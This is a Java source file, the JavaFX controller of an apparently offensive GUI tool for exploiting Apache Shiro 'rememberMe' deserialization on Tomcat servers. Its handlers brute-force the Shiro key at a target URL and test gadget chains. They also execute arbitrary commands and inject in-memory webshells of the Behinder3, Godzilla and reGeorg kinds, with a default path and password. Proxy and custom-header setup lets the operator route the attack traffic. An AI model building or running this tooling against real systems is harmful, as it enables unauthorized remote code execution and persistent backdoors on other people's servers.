package ui;

import common.CommonUtils;
import core.CommandExecute;
import core.GadgetCheck;
import core.MemInject;
import core.ShiroKeyBrute;
import entity.ControllersFactory;
import javafx.collections.FXCollections;
import javafx.collections.ObservableList;
import javafx.event.ActionEvent;
import javafx.fxml.FXML;
import javafx.fxml.Initializable;
import javafx.geometry.Insets;
import javafx.geometry.Pos;
import javafx.scene.Node;
import javafx.scene.control.*;
import javafx.scene.layout.GridPane;
import javafx.scene.layout.HBox;
import javafx.stage.Window;
import javafx.stage.WindowEvent;

import java.net.Authenticator;
import java.net.PasswordAuthentication;
import java.net.Proxy;
import java.net.URL;
import java.util.HashMap;
import java.util.Map;
import java.util.ResourceBundle;


public class MyController implements Initializable {

    public ShiroKeyBrute shiroKeyBrute = null;
    public GadgetCheck gadgetCheck = null;
    public CommandExecute commandExecute = null;
    public MemInject memInject = null;
//    public static Map currentProxy = new HashMap<>();

    // 运行按钮
    @FXML
    private Button burpKey;

    // 检测按钮
    @FXML
    private Button checkGadget;

    @FXML
    private Button cmdExecute;

    @FXML
    private Button memShellInject;

    @FXML
    private TextField command;

    @FXML
    private TextField attackUrl;

    @FXML
    private TextField postParam;

    @FXML
    private ComboBox<String> httpMethod;

    @FXML
    public TextArea result;

    @FXML
    private ComboBox<String> contentType;

//    @FXML
//    private TextField customProxy;

    @FXML
    private ComboBox<String> gadget;

    @FXML
    private ComboBox<String> middleWare;

    @FXML
    private ComboBox<String> memShellType;

    @FXML
    public TextField key;

    @FXML
    private CheckBox encryptType;

    @FXML
    private CheckBox outputType;

    @FXML
    private TextField rmbMe;

    @FXML
    private TextField memShellPath;

    @FXML
    private TextField memShellPwd;

    @FXML
    private MenuItem proxySetUpBtn;

    @FXML
    private MenuItem headerSetUpBtn;


    @Override
    public void initialize(URL location, ResourceBundle resources) {
        initToolbar();
        initComboBox();
        ControllersFactory.controllers.put(MyController.class.getSimpleName(),this);
        rmbMe.setText("rememberMe");
        memShellPath.setText("/demo.ico");
        memShellPwd.setText("pass");
    }
    // 运行按钮事件
    @FXML
    void burpKey(ActionEvent event) throws Exception {
        setEncryptType();
        setOutputType();
        String targetUrl = attackUrl.getText();
        String method = httpMethod.getValue();
        String contenttype = contentType.getValue();
        String rememberMe = rmbMe.getText();
        if (rememberMe.length() != 0){
            ControllersFactory.paramsContext.put("rememberMe",rememberMe);
        } else {
            ControllersFactory.paramsContext.put("rememberMe","rememberMe");
        }
        ControllersFactory.paramsContext.put("Method",method);
        ControllersFactory.paramsContext.put("ContentType",contenttype);
        ControllersFactory.paramsContext.put("PostParam",postParam.getText());
        // 这样的话每按一次按钮都重新创建对象
        if (targetUrl.length() != 0){
            this.shiroKeyBrute = new ShiroKeyBrute();
            this.shiroKeyBrute.shiroDetect(targetUrl,method);
        } else {
            this.result.appendText("[!] URL地址为空\n");
        }
    }

    public boolean checkKeyBurpSuccess() throws Exception{
        String shiroKey = ControllersFactory.paramsContext.get("ShiroKey");
        // 如果获取为空的话就先从框里面获取
        if (shiroKey != null){
            return true;
        }else {
            shiroKey = this.key.getText();
            if (shiroKey.length() == 0){
                this.result.appendText("[!] 请先爆破Key或输入Key\n\n");
                return false;
            } else {
                // 如果输入了 key 那么就添加进去
                ControllersFactory.paramsContext.put("ShiroKey",shiroKey);
                return true;
            }
        }
    }

    // 检测当前利用链
    @FXML
    void checkGadget(ActionEvent event) throws Exception{
//        String shiroKey = ControllersFactory.paramsContext.get("ShiroKey");
//        if (shiroKey == null){
//            shiroKey = this.key.getText();
//        }
//        if (shiroKey.length() == 0){
//            this.result.appendText("[!] 请先爆破Key或输入Key\n\n");
//        }else{
//            setOutputType();
//            setEncryptType();
//            if (middleWare.getValue().equals("Tomcat")){
//                String gadget = this.gadget.getValue();
//                gadgetCheck = new GadgetCheck();
//                flag = gadgetCheck.checkGadget(gadget);
//                // 利用成功的链存到successGadget里面
//                if (flag == true){
//                    ControllersFactory.successGadget.put(this.gadget.getValue(),Class.forName("payloads."+this.gadget.getValue()));
//                }
//            }else if (middleWare.getValue().equals("Weblogic")){
//                this.result.appendText("Weblogic 还没做Orz");
//            }
//        }
        boolean flag = false;
        if (checkKeyBurpSuccess()){
            setOutputType();
            setEncryptType();
            if (middleWare.getValue().equals("Tomcat")){
                String gadget = this.gadget.getValue();
                String method = httpMethod.getValue();
                gadgetCheck = new GadgetCheck();
                // 检测利用链
                flag = gadgetCheck.tomcatCheckGadget(method,gadget);
                // 利用成功的链存到successGadget里面
                if (flag == true){
                    ControllersFactory.successGadget.put(this.gadget.getValue(),Class.forName("payloads."+this.gadget.getValue()));
                }
            }else if (middleWare.getValue().equals("Weblogic")){
                this.result.appendText("Weblogic 还没做Orz");
            }
        }
    }


    // 命令注入按钮
    @FXML
    void cmdExecute(ActionEvent event) throws Exception{
        // 第一件事情就是校验key是否爆破成功
        if (checkKeyBurpSuccess()){
            setOutputType();    // 是否输出
            setEncryptType();   // 加密模式
            String gadget = this.gadget.getValue(); // 获取选择的 gadget
            String cmd = this.command.getText();    // 获取命令
            String midware = this.middleWare.getValue();    // 获取中间件类型
            if (midware.equals("Tomcat")){
                commandExecute = new CommandExecute();
                commandExecute.tomcatCommandExecute(gadget,cmd);
            }else if (midware.equals("Weblogic")){
                this.result.appendText("[!] Weblogic 还没做Orz\n");
            }
        }
    }

    // 内存马注入按钮事件
    @FXML
    void memShellInject(ActionEvent event) throws Exception{
        /**
         * 首先检查 shirokey 是否存在上下文中
         * 检查 successgadget 中是否有可利用的利用链
         * 这里需要两个上下文
         * 一个是用来存储内存马中的 loader 加载器 rememberMe
         * 第二个用来存储 内存马中 post 发送的内容
         */
        if (checkKeyBurpSuccess()){
            setOutputType();
            setEncryptType();
            String gadget = this.gadget.getValue(); // 先获取选择的 gadget
            Class gadgetClass = ControllersFactory.successGadget.get(gadget); // 根据选中的gadget去检测成功的里面进行获取
            if (gadgetClass != null){
                String midware = this.middleWare.getValue();    // 获取中间件名字
                String memShellType = this.memShellType.getValue();  // 获取内存马类型 冰蝎/哥斯拉/reg
                ControllersFactory.paramsContext.put("Path",memShellPath.getText());  // 将 gui 获取的路径存到上下文里面去
                String password = memShellPwd.getText(); // 获取密码
                if (midware.equals("Tomcat")){  // 中间件类型
                    memInject = new MemInject();
                    memInject.baseInject(gadget,memShellType,password); // 三种内存马类型
                } else if (midware.equals("Weblogic")){     // 中间件类型
                    this.result.appendText("Weblogic 还没做Orz");
                }

            }else {
                this.result.appendText("[!] 请先获取或检测对应的利用链\n");
            }
        }


//        if (shiroKey.length() == 0){
//            this.result.appendText("[!] 请先爆破Key或输入Key\n\n");
//        } else {
//            String gadget = this.gadget.getValue();
//            Class gadgetClass = ControllersFactory.successGadget.get(gadget);
//            if (gadgetClass != null){
//                // 获取到可以利用的利用链，获取到了 shirokey，获取到了对应到中间件
//                String midware = this.middleWare.getValue();
//                String memShellType = this.memShellType.getValue();  // 内存马类型
//                ControllersFactory.paramsContext.put("Path",memShellPath.getText());
////                ControllersFactory.paramsContext.put("Password",memShellPwd.getText());
//                String password = memShellPwd.getText();
//                if (midware.equals("Tomcat")){
//                    memInject = new MemInject();
//                    // 注入的话是需要获取 path 密码 以及当前的内存马类型
//                    // 传入当前选择的 gadget 和 内存马类型
//                    memInject.baseInject(gadget,memShellType,password);
//
//                } else if (midware.equals("Weblogic")){
//                    this.result.appendText("Weblogic 还没做Orz");
//                }
//
//            }else {
//                this.result.appendText("[!] 请先获取或检测对应的利用链\n");
//            }
//        }

    }


    // 下拉控件初始化
    private void initComboBox(){
        ObservableList<String> methods = FXCollections.observableArrayList("GET", "POST");
        httpMethod.setPromptText("GET");
        httpMethod.setValue("GET");
        // 设置combobox 的属性
        httpMethod.setItems(methods);

        httpMethod.setOnAction(event ->{
            if (httpMethod.getValue().equals("POST")){
                contentType.setDisable(false);
                postParam.setDisable(false);
            }

            if (httpMethod.getValue().equals("GET")){
                contentType.setDisable(true);
                postParam.setDisable(true);
            }
            }
        );

        ObservableList<String> contentTypes = FXCollections.observableArrayList("application/x-www-form-urlencoded", "application/json","application/xml");
        contentType.setPromptText("application/x-www-form-urlencoded");
        contentType.setValue("application/x-www-form-urlencoded");
        contentType.setItems(contentTypes);

        ObservableList<String> gadgets = FXCollections.observableArrayList("CommonsBeanutils1_183","CommonsCollectionsK1","CommonsCollections11","CommonsBeanutils1");
        gadget.setPromptText("CommonsBeanutils1_183");
        gadget.setValue("CommonsBeanutils1_183");
        gadget.setItems(gadgets);

        ObservableList<String> middleWares = FXCollections.observableArrayList("Tomcat", "Weblogic");
        middleWare.setPromptText("Tomcat");
        middleWare.setValue("Tomcat");
        middleWare.setItems(middleWares);

        // 内存马类型初始化
        ObservableList<String> memShellTypes = FXCollections.observableArrayList("Behinder3", "Godzilla","reGeorg");
        memShellType.setPromptText("Behinder3");
        memShellType.setValue("Behinder3");
        memShellType.setItems(memShellTypes);

        contentType.setDisable(true);
        postParam.setDisable(true);
    }

//    public void setProxy() throws Exception{
//        String proxy = customProxy.getText();
//        if (proxy != null){
//            ControllersFactory.paramsContext.put("MyProxy",proxy);
//        }
//    }

    private void setEncryptType() throws Exception{
        if (encryptType.isSelected()){
            ControllersFactory.paramsContext.put("Encrypt","GCM");
        } else {
            ControllersFactory.paramsContext.put("Encrypt","CBC");
        }
    }

    private void setOutputType() throws Exception{
        if (outputType.isSelected()){
            ControllersFactory.paramsContext.put("OutputType","1");
        }else {
            ControllersFactory.paramsContext.put("OutputType","0");
        }
    }

    public void initAttack(){
        String targetUrl = attackUrl.getText();
    }

    private void initToolbar() {
        this.proxySetUpBtn.setOnAction(event -> {
            Alert inputDialog = new Alert(Alert.AlertType.NONE);
            inputDialog.setResizable(true);
            Window window = inputDialog.getDialogPane().getScene().getWindow();
            window.setOnCloseRequest(((e) -> {
                window.hide();
            }));
            ToggleGroup statusGroup = new ToggleGroup();
            RadioButton enableRadio = new RadioButton("启用");
            RadioButton disableRadio = new RadioButton("禁用");

            enableRadio.setToggleGroup(statusGroup);
            disableRadio.setToggleGroup(statusGroup);

            HBox statusHbox = new HBox();
            statusHbox.setSpacing(10.0D);
            statusHbox.getChildren().add(enableRadio);
            statusHbox.getChildren().add(disableRadio);
            GridPane proxyGridPane = new GridPane();
            proxyGridPane.setVgap(15.0D);
            proxyGridPane.setPadding(new Insets(20.0D, 20.0D, 0.0D, 10.0D));
            Label typeLabel = new Label("类型");
            ComboBox<String> typeCombo = new ComboBox();
            typeCombo.setItems(FXCollections.observableArrayList("HTTP", "SOCKS" ));
            typeCombo.getSelectionModel().select(0);
            // HTTP SOCKS 选择
            if (typeCombo.equals("HTTP")){
                typeCombo.getSelectionModel().select(0);
            }else if (typeCombo.equals("SOCKS")){
                typeCombo.getSelectionModel().select(1);
            }

            Label IPLabel = new Label("IP地址");
            TextField IPText = new TextField();
            Label PortLabel = new Label("端口");
            TextField PortText = new TextField();
            Label userNameLabel = new Label("用户名");
            TextField userNameText = new TextField();
            Label passwordLabel = new Label("密码");
            TextField passwordText = new TextField();
            Button cancelBtn = new Button("取消");
            Button saveBtn = new Button("保存");
            saveBtn.setDefaultButton(true);

            if (ControllersFactory.currentProxy.get("Proxy") != null) {
                Proxy currProxy = (Proxy)ControllersFactory.currentProxy.get("Proxy");
                String proxyInfo = currProxy.address().toString();
                String[] info = proxyInfo.split(":");
                String hisIpAddress = info[0].replace("/", "");
                String hisPort = info[1];
                IPText.setText(hisIpAddress);
                PortText.setText(hisPort);

                String username = ControllersFactory.paramsContext.get("username");
                String password = ControllersFactory.paramsContext.get("password");
                if (username != null && password != null){
                    userNameText.setText(username);
                    passwordText.setText(password);
                }
                enableRadio.setSelected(true);
            } else {
                // 禁用
                enableRadio.setSelected(false);
                disableRadio.setSelected(true);
            }

            // 身份验证没有做测试
            saveBtn.setOnAction((e -> {
                if(enableRadio.isSelected()){
                    String type = typeCombo.getValue().toString();
                    // 进行身份验证(暂未进行验证
                    if (!userNameText.getText().trim().equals("")) {
                        String password  = passwordText.getText();
                        ControllersFactory.paramsContext.put("username", userNameText.getText().trim());
                        ControllersFactory.paramsContext.put("password", password);
                        final String proxyUser = userNameText.getText().trim();
                        Authenticator.setDefault(new Authenticator() {
                            public PasswordAuthentication getPasswordAuthentication() {
                                return new PasswordAuthentication(proxyUser, password.toCharArray());
                            }
                        });
                    } else {
                        Authenticator.setDefault((Authenticator)null);
                    }


                    if (type.equals("HTTP")){
                        CommonUtils.addHttpProxy(IPText.getText(), Integer.parseInt(PortText.getText()));
                    }else if (type.equals("SOCKS")){
                        CommonUtils.addSocksProxy(IPText.getText(), Integer.parseInt(PortText.getText()));
                    }
                }else {
                    CommonUtils.clearCurrentProxy();
                }
                inputDialog.getDialogPane().getScene().getWindow().hide();
            }));

            // 取消按钮
            cancelBtn.setOnAction((e -> {
                inputDialog.getDialogPane().getScene().getWindow().hide();
            }));

            proxyGridPane.add((Node)statusHbox, 1, 0);
            proxyGridPane.add((Node)typeLabel, 0, 1);
            proxyGridPane.add((Node)typeCombo, 1, 1);
            proxyGridPane.add((Node)IPLabel, 0, 2);
            proxyGridPane.add((Node)IPText, 1, 2);
            proxyGridPane.add((Node)PortLabel, 0, 3);
            proxyGridPane.add((Node)PortText, 1, 3);
            proxyGridPane.add((Node)userNameLabel, 0, 4);
            proxyGridPane.add((Node)userNameText, 1, 4);
            proxyGridPane.add((Node)passwordLabel, 0, 5);
            proxyGridPane.add((Node)passwordText, 1, 5);
            // 添加按钮事件
            HBox buttonBox = new HBox();
            buttonBox.setSpacing(20.0D);
            buttonBox.setAlignment(Pos.CENTER);
            buttonBox.getChildren().add(cancelBtn);
            buttonBox.getChildren().add(saveBtn);
            GridPane.setColumnSpan((Node)buttonBox, Integer.valueOf(2));
            proxyGridPane.add((Node)buttonBox, 0, 6);
            inputDialog.getDialogPane().setContent((Node)proxyGridPane);
            inputDialog.showAndWait();
        });


        // 自定义header头设置
        this.headerSetUpBtn.setOnAction(event -> {
            Alert alert = new Alert(Alert.AlertType.NONE);
            alert.setResizable(true);
            Window window = alert.getDialogPane().getScene().getWindow();
            window.setOnCloseRequest(((e) -> {
                window.hide();
            }));
            TextArea customHeader = new TextArea();
            Button saveBtn = new Button("保存");
            saveBtn.setDefaultButton(true);
            Button cancelBtn = new Button("取消");
            GridPane vpsInfoPane = new GridPane();
            GridPane.setMargin(vpsInfoPane, new Insets(20.0D, 0.0D, 0.0D, 0.0D));
            vpsInfoPane.setVgap(10.0D);
            vpsInfoPane.setMaxWidth(Double.MAX_VALUE);

            // 如果用户输入了的话
            // 先从pagecontext 里面获取 ..
            // 存一个特征标志到paramContext 里面吧
            // 说明已经设置了用户头
            if (ControllersFactory.paramsContext.get("CustomHeader")!=null){
                // 从hashmap中输出存储的header
                for (Map.Entry entry:ControllersFactory.currentHeader.entrySet()){
                    customHeader.appendText(entry.getKey() + ":" + entry.getValue() + "\n");
                }
            }

            saveBtn.setOnAction(e -> {
                // 如果不为空的话就把内容存到上下文里面去,同时为空
                if (!customHeader.getText().trim().equals("")){
//                    ControllersFactory.currentHeader.put()
                    for (String line:customHeader.getText().trim().split("\n")){
                        int index = line.indexOf(":");
                        String key = line.substring(0, index).trim();
                        String value = line.substring(index+1).trim();
                        ControllersFactory.currentHeader.put(key,value);
                    }
                    ControllersFactory.paramsContext.put("CustomHeader","Success");
                }else {
                    ControllersFactory.paramsContext.put("CustomHeader",null);
                }
                alert.getDialogPane().getScene().getWindow().hide();
            });

            cancelBtn.setOnAction(e -> {
                alert.getDialogPane().getScene().getWindow().hide();
            });
            vpsInfoPane.add(new Label("自定义请求头："), 0, 4);
            vpsInfoPane.add(customHeader, 1, 4);
            HBox buttonBox = new HBox();
            buttonBox.setSpacing(20.0D);
            buttonBox.getChildren().addAll(new Node[]{cancelBtn, saveBtn});
            buttonBox.setAlignment(Pos.BOTTOM_CENTER);
            vpsInfoPane.add(buttonBox, 0, 8);
            GridPane.setColumnSpan(buttonBox, 2);
            alert.getDialogPane().setContent(vpsInfoPane);
            alert.showAndWait();
        });
    }

}
